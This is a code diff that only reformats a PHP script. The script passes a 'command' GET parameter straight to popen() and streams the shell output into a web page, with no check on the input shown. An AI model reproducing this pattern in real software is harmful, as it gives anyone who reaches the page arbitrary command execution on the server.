@@ -7,29 +7,30 @@ echo '<link rel="stylesheet" href="assets/style.css">';
 echo '<div class="contentBox">';
 set_time_limit(0);
 
-$c = _GET('command','unknow');
+$c = _GET('command', 'unknow');
 
 if ($c == 'unknow') {
-	echo '';
-	exit;
+    echo '';
+    exit;
 }
 
 $handle = popen($c, "r");
 
-if (ob_get_level() == 0)
-ob_start();
+if (ob_get_level() == 0) {
+    ob_start();
+}
 
-while(!feof($handle)) {
+while (!feof($handle)) {
 
-	$buffer = fgets($handle);
-	$buffer = trim(htmlspecialchars($buffer));
+    $buffer = fgets($handle);
+    $buffer = trim(htmlspecialchars($buffer));
 
-	echo $buffer . "<br />";
-	echo str_pad('', 4096);
+    echo $buffer . "<br />";
+    echo str_pad('', 4096);
 
-	ob_flush();
-	flush();
-	sleep(0.001);
+    ob_flush();
+    flush();
+    sleep(0.001);
 }
 
 pclose($handle);
